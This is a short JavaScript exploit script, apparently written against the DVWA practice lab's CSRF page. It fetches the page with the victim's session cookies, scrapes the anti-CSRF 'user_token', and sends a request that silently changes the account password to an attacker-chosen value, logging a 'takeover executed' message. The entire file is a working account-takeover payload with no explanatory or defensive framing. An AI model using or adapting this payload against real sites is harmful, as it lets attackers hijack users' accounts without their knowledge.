const csrfPath = '/vulnerabilities/csrf/';

fetch(csrfPath, { credentials: 'include' })
  .then(r => r.text())
  .then(htmlText => {
    const doc = new DOMParser().parseFromString(htmlText, 'text/html');
    const token = doc.querySelector('input[name="user_token"]').value;
    
    const exploitUrl = `${csrfPath}?password_new=RealExploit123!&password_conf=RealExploit123!&Change=Change&user_token=${encodeURIComponent(token)}`;
    return fetch(exploitUrl, { credentials: 'include' });
  })
  .then(() => {
    console.log("[+] Silent CSRF Takeover Executed!");
  });
